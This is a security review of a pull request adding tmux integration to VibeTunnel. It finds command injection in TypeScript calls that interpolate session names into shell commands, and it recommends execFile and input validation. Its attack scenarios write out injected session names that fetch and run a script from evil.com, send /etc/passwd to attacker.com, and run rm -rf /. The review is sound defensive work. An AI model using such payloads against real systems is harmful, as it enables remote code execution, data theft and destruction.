# Security Review: PR #460 - Add tmux integration to VibeTunnel

## Critical Security Vulnerabilities Found

This PR contains **CRITICAL COMMAND INJECTION VULNERABILITIES** that make it unsafe to merge. User-controlled input is directly interpolated into shell commands without proper escaping or sanitization.

## Vulnerable Code Locations

### 1. tmux-manager.ts

#### Line 87: Window listing command injection
```typescript
const { stdout } = await execAsync(
  `tmux list-windows -t '${sessionName}' -F '#{session_name}|#{window_index}|#{window_name}|#{?window_active,active,}|#{window_panes}'`,
  { shell: '/bin/sh' }
);
```
**Issue**: `sessionName` is directly interpolated. A malicious session name like `'; rm -rf / #` would execute arbitrary commands.

#### Line 119: Pane listing command injection
```typescript
const { stdout } = await execAsync(
  `tmux list-panes -t '${target}' -F '#{session_name}|#{window_index}|#{pane_index}|#{?pane_active,active,}|#{pane_title}|#{pane_pid}|#{pane_current_command}|#{pane_width}|#{pane_height}|#{pane_current_path}'`,
  { shell: '/bin/sh' }
);
```
**Issue**: `target` is constructed from user input without sanitization.

#### Line 155: Session creation command injection
```typescript
await execAsync(`tmux new-session -d -s '${name}' ${cmd}`);
```
**Issue**: Both `name` and `cmd` are injected directly. The `cmd` is particularly dangerous as it's meant to execute commands.

#### Line 217: Send keys command injection
```typescript
await execAsync(`tmux send-keys -t '${target}' '${command}' Enter`);
```
**Issue**: Both `target` and `command` parameters are vulnerable.

#### Lines 230, 243, 256: Kill commands
```typescript
await execAsync(`tmux kill-session -t '${sessionName}'`);
await execAsync(`tmux kill-window -t '${sessionName}:${windowIndex}'`);
await execAsync(`tmux kill-pane -t '${paneId}'`);
```
**Issue**: All parameters are directly interpolated without escaping.

### 2. zellij-manager.ts

Similar vulnerabilities exist in the Zellij manager where user input is directly passed to shell commands.

### 3. screen-manager.ts

The Screen manager also has the same pattern of vulnerabilities.

## Attack Scenarios

1. **Remote Code Execution**: An attacker could create a session named `'; curl evil.com/script.sh | sh #` to download and execute malicious scripts.

2. **Data Exfiltration**: Session names like `'; cat /etc/passwd | curl -X POST -d @- attacker.com #` could steal sensitive data.

3. **System Destruction**: Names like `'; rm -rf / #` could destroy the system (though modern systems have some protections).

4. **Privilege Escalation**: If the VibeTunnel server runs with elevated privileges, attackers could exploit this to gain higher access.

## Recommended Fixes

### 1. Use execFile Instead of exec
Replace all `exec` and `execAsync` calls with `execFile` which doesn't invoke a shell:

```typescript
import { execFile } from 'child_process';
import { promisify } from 'util';
const execFileAsync = promisify(execFile);

// Safe version:
const { stdout } = await execFileAsync('tmux', [
  'list-windows',
  '-t', sessionName,  // Passed as separate argument, not interpolated
  '-F', '#{session_name}|#{window_index}|#{window_name}|#{?window_active,active,}|#{window_panes}'
]);
```

### 2. Input Validation
Add strict validation for all user inputs:

```typescript
function validateSessionName(name: string): boolean {
  // Only allow alphanumeric, dash, underscore
  return /^[a-zA-Z0-9_-]+$/.test(name);
}

function validateWindowIndex(index: number): boolean {
  return Number.isInteger(index) && index >= 0 && index < 1000;
}
```

### 3. Shell Escaping (Less Preferred)
If you must use shell execution, properly escape all inputs:

```typescript
import { escape } from 'shell-escape';

// Example (though execFile is still preferred):
const escapedName = escape([sessionName]);
await execAsync(`tmux list-windows -t ${escapedName} ...`);
```

### 4. Command Whitelisting
For the `createSession` command parameter, use a whitelist of allowed commands or construct them programmatically rather than accepting arbitrary input.

## Additional Security Concerns

1. **No Rate Limiting**: The API endpoints have no rate limiting, allowing DoS attacks through rapid session creation.

2. **No Authentication**: The multiplexer routes appear to have no authentication, allowing any user to kill sessions.

3. **Resource Limits**: No limits on the number of sessions a user can create.

## Conclusion

**This PR MUST NOT be merged in its current state.** The command injection vulnerabilities present a severe security risk that could lead to complete system compromise. All shell command executions must be refactored to use safe methods before this code can be considered for production use.

## Recommended Actions

1. **Immediate**: Block this PR from merging
2. **Short-term**: Implement all security fixes listed above
3. **Medium-term**: Add security testing to CI pipeline
4. **Long-term**: Security audit of the entire codebase for similar patterns